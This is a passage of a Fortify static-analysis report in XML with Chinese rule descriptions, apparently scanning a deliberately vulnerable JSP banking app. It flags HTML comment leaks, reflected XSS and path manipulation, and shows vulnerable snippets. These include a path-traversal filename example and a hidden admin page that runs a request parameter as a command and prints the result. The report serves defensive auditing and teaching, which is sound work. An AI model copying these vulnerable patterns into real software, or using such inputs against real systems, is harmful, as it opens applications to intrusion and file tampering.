&lt;form method="POST" action="recalcOrbit"&gt;
...


甚至那些看上去并非恶意的注释也可能有利于某些人了解系统的构建形式。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>使用 JSP 注释来代替 HTML 注释（JSP 注释不会传递给用户）。

例 2：前面的示例已重写为使用 JSP 注释，该注释不会显示给用户。


&lt;%-- TBD: this needs a security audit --%&gt;
&lt;form method="POST" action="recalcOrbit"&gt;
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>11</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2F38C149CA6D08844F456AA0E6FA85AB" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>login.jsp 中第 261 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>login.jsp</FileName>
                                <FilePath>login/login.jsp</FilePath>
                                <LineStart>261</LineStart>
                                <Snippet>							&lt;/tr&gt;
							&lt;tr valign="top" class="links"&gt;
								&lt;!-- 3rd row --&gt;
								&lt;td&gt;&lt;br /&gt;
									&lt;img src="&lt;s:url value="/img/small-ad3.gif" includeParams="none"/&gt;" /&gt;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1E4632E0BCBF1ACC3E38D436A498A314" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>login.jsp 中第 234 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>login.jsp</FileName>
                                <FilePath>login/login.jsp</FilePath>
                                <LineStart>234</LineStart>
                                <Snippet>							&lt;/tr&gt;
							&lt;tr valign="top" class="links"&gt;
								&lt;!-- 2st row --&gt;
								&lt;td width="33%"&gt;&lt;h2 class="row2title"&gt;&amp;nbsp;&amp;nbsp;Open an Account&lt;/h2&gt;
									&lt;a  title ="Open a Checking Account Today"&gt;Checking Account&lt;/a&gt;&lt;br /&gt;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CE9CDF4DFF1F33ED3E7E7EFDFD4D6747" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>login.jsp 中第 207 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>login.jsp</FileName>
                                <FilePath>login/login.jsp</FilePath>
                                <LineStart>207</LineStart>
                                <Snippet>							&lt;/tr&gt;
							&lt;tr valign="top" class="links"&gt;
								&lt;!-- 1st row --&gt;
								&lt;td width="33%" &gt;&lt;h2 class="row1title"&gt;&amp;nbsp;&amp;nbsp;Banking&lt;/h2&gt;
									&lt;a &gt;Checking&lt;/a&gt;&lt;br /&gt;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="90DA9C6E082DF5C08615BE11A9727A04" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>career_details_error.jsp 中第 1 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>1</LineStart>
                                <Snippet>&lt;!-- Page is coming from pebble,  web/WEB-INF/jsp/error.jsp --&gt;

&lt;%@ page isErrorPage="true" %&gt;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D4053704B672624EC5FC6DCB4B821B4C" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Register.jsp 中第 71 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Register.jsp</FileName>
                                <FilePath>login/Register.jsp</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>			            &lt;b&gt;Sign Up with Riches Wealth International today!&lt;/b&gt;

                        &lt;!-- When the user was redirected from one of the banks that were acquired, RWi states the name of the old bank
                        Example: http://yoursite.com/riches/login/Register.action?template=/pages/acquired/first_riches_invest.jsp
                        --&gt;</Snippet>
                                <TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>error.jsp 中的方法 _jspService() 向第 11 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：

1. 数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Reflected XSS，不可信赖的数据源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该数据源通常为数据库或其他后端数据存储。


2. 未检验包含在动态内容中的数据，便将其传送给了 Web 用户。

传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私有数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。


示例 1：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并将其显示给用户。


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。

起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。


示例 2：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并输出相应雇员姓名。


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



如同Example 1，如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的漏洞利用行为无能为力。同样，这段代码看起来似乎危险较小，因为 name 的值是从数据库中读取的，而且这些内容明显是由应用程序管理的。然而，如果 name 的值来自用户提供的数据，数据库就会成为恶意内容传播的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的漏洞利用称为 Persistent XSS（或 Stored XSS），它极其隐蔽，因为数据存储导致的间接行为会增大辨别威胁的难度，并使多个用户受此攻击影响的可能性提高。XSS 漏洞利用首先会在网站上为访问者提供一个“留言簿”。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿页面的访问者都会执行这些恶意代码。

有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。

正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：

- 如Example 1 中所示，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。

- 如Example 2 中所示，应用程序将危险数据存储在数据库或其他可信赖的数据存储中。这些危险数据随后会被读回到应用程序中，并包含在动态内容中。在以下情况下会发生 Persistent XSS 漏洞利用：攻击者将危险内容注入到数据存储中，而这些危险内容随后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于显示给许多用户或显示给特定相关用户的区域。这些相关用户通常在应用程序中具备较高的特权，或者可以与敏感数据交互，这些数据对攻击者来说具有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人敏感数据的访问权。

- 如Example 3 中所示，应用程序外部的源会将危险数据存储在数据库或其他数据存储中，随后这些危险数据会作为可信数据读回到应用程序并包含在动态内容中。


许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，该规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。

由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。

由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。

针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。

更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：

在有关块级别元素的内容中（位于一段文本的中间）：

－“&lt;”是一个特殊字符，因为它可以引入一个标签。

－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。

－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。

下面的这些原则适用于属性值：

－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。

-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。

例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：

－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。

-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。

- 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。

－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。


在 &lt;SCRIPT&gt; &lt;/SCRIPT&gt; 的正文内：

- 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。

服务器端脚本：

－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (")，则可能需要对此进行更多过滤。

其他可能出现的情况：

－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。

在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。

如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。

许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify 安全编码规则包将就 SQL Injection 和 Access Control 提出警告：当把不可信赖的数据写入数据库时，数据库将出现问题，并且会将数据库当作不可信赖的数据的来源，这会导致 XSS 漏洞。如果数据库在您的环境中是可信赖的资源，则使用自定义筛选器筛选出包含 DATABASE 污染标志或来自数据库源的数据流问题。尽管如此，对所有从数据库中读取的内容进行验证仍然是较好的做法。

2. 虽然使用 URL 对不可信数据进行编码可以防止许多 XSS 攻击，但部分浏览器（尤其是 Internet Explorer 6 和 7 以及其他浏览器）在将数据传递给 JavaScript 解释器之前，会自动在文档对象模型 (DOM) 中的特定位置对其内容进行解码。为了反映出其危险之处，规则包不再认为 URL 编码例程足以防御 cross-site scripting 攻击。如果对数据值进行 URL 编码并随后输出，Fortify 将会报告存在 Cross-Site Scripting: Poor Validation 漏洞。

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>10</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="ED7C160DFF53BEFFF26645AB44E3355D" ruleID="969DAFE8-3A94-4257-B981-8404B7803441">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>login.jsp 中的方法 _jspService() 向第 82 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>login.jsp</FileName>
                                <FilePath>login/login.jsp</FilePath>
                                <LineStart>82</LineStart>
                                <Snippet>                                            &lt;c:choose&gt;
                                                &lt;c:when test="${param.errorMsg != null}" &gt;
                                                    &lt;font color="red"&gt;${param.errorMsg}&lt;/font&gt;
                                                &lt;/c:when&gt;
                                            &lt;/c:choose&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>login.jsp</FileName>
                                <FilePath>login/login.jsp</FilePath>
                                <LineStart>82</LineStart>
                                <Snippet>                                            &lt;c:choose&gt;
                                                &lt;c:when test="${param.errorMsg != null}" &gt;
                                                    &lt;font color="red"&gt;${param.errorMsg}&lt;/font&gt;
                                                &lt;/c:when&gt;
                                            &lt;/c:choose&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="94A87C7E40066E42EDB63B51A11AD849" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 中的方法 _jspService() 向第 103 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>103</LineStart>
                                <Snippet>			 }
			 pageContext.getOut().flush();
			 pageContext.getOut().println("&lt;h1&gt;Response from command &lt;i&gt;"+command+"&lt;/i&gt;&lt;/h1&gt;&lt;br/&gt;");
			 pageContext.getOut().println("&lt;pre&gt;" + output + "&lt;/pre&gt;");
		 }</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>74</LineStart>
                                <Snippet>%&gt;
&lt;%
   String cmd = request.getParameter("actions");

   if ((cmd != null) &amp;&amp; (cmd.length() &gt; 0))</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5E9F753B5928560ED7EAA3DE75867A4A" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>error.jsp 中的方法 _jspService() 向第 11 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>error.jsp</FileName>
                                <FilePath>login/error.jsp</FilePath>
                                <LineStart>11</LineStart>
                                <Snippet>&lt;/head&gt;
&lt;body bgcolor="white"&gt;
Bad credentials for : &lt;%=request.getParameter("j_username")%&gt;&lt;br&gt;
Try &lt;a href='&lt;%= request.getContextPath() %&gt;'&gt;again&lt;/a&gt;.
&lt;/body&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>error.jsp</FileName>
                                <FilePath>login/error.jsp</FilePath>
                                <LineStart>11</LineStart>
                                <Snippet>&lt;/head&gt;
&lt;body bgcolor="white"&gt;
Bad credentials for : &lt;%=request.getParameter("j_username")%&gt;&lt;br&gt;
Try &lt;a href='&lt;%= request.getContextPath() %&gt;'&gt;again&lt;/a&gt;.
&lt;/body&gt;</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9211D2873AFE3EE8A4317CD1C3156BCB" ruleID="969DAFE8-3A94-4257-B981-8404B7803441">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>career_details_error.jsp 中的方法 _jspService() 向第 21 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>21</LineStart>
                                <Snippet>Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}
External URI : ${externalUri}
Internal URI : ${internalUri}</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>21</LineStart>
                                <Snippet>Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}
External URI : ${externalUri}
Internal URI : ${internalUri}</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletRequest.getQueryString()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AFBBCE8FAA342FD72062C724C4B6B089" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 中的方法 _jspService() 向第 33 行的 Web 浏览器发送非法数据，从而导致浏览器执行恶意代码。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>				{
				String emailAddress = users[index];
				pageContext.getOut().println(emailAddress);

				msgClass.setTo(emailAddress);</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>24</LineStart>
                                <Snippet>	   {
	   SendMessage msgClass = new SendMessage();
	   String specifiedUsers = request.getParameter("users");
	   if ((specifiedUsers != null) &amp;&amp; (specifiedUsers.length() &gt; 0))
			{</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Path Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>攻击者可以控制 ConnectionFactory.java 中第 28 行的 FileInputStream() 文件系统路径参数，借此访问或修改其他受保护的文件。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>当满足以下两个条件时，就会产生 path manipulation 错误：

1. 攻击者可以指定某一文件系统操作中所使用的路径。

2. 攻击者可以通过指定特定资源来获取某种权限，而这种权限在一般情况下是不可能获得的。

例如，在某一程序中，攻击者可以获得特定的权限，以重写指定的文件或是在其控制的配置环境下运行程序。


例 1： 下面的代码使用来自于 HTTP 请求的输入来创建一个文件名。程序员没有考虑到攻击者可能使用像“../../tomcat/conf/server.xml”一样的文件名，从而导致应用程序删除它自己的配置文件。


String rName = request.getParameter("reportName");
File rFile = new File("/usr/local/apfr/reports/" + rName);
...
rFile.delete();


示例 2：以下代码使用来自于配置文件的输入来决定打开哪个文件，并返回给用户。如果程序以足够的权限运行，且恶意用户能够篡改配置文件，那么他们可以通过程序读取系统中以扩展名 .txt 结尾的任何文件。


fis = new FileInputStream(cfg.getProperty("sub")+".txt");
amt = fis.read(arr);
out.println(arr);


有些人认为在移动世界中，典型的漏洞（如 path manipulation）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 3：以下代码会调整Example 1 以适应 Android 平台。


...
        String rName = this.getIntent().getExtras().getString("reportName");
        File rFile = getBaseContext().getFileStreamPath(rName);
...
        rFile.delete();
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>防止 path manipulation 的最佳方法是采用一些间接手段：例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。

但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 如果程序正在执行您认为合理的自定义输入验证，请使用 Fortify Custom Rules Editor（Fortify 自定义规则编辑器）为该验证例程创建清理规则。

2. 执行有效的黑名单是一件非常困难的事情。如果验证逻辑依赖于黑名单，那么有必要对这种逻辑进行质疑。鉴于不同类型的输入编码以及各种元字符集在不同的操作系统、数据库或其他资源中可能有不同的含义，确定随着需求的不断变化，黑名单能否方便、正确、完整地进行更新。

3. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>10</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CDC2BD7364FBD17F709AA22B88FC1FC1" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>攻击者可以控制 UploadProfilePicture.java 中第 55 行的 File() 文件系统路径参数，借此访问或修改其他受保护的文件。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>UploadProfilePicture.java</FileName>
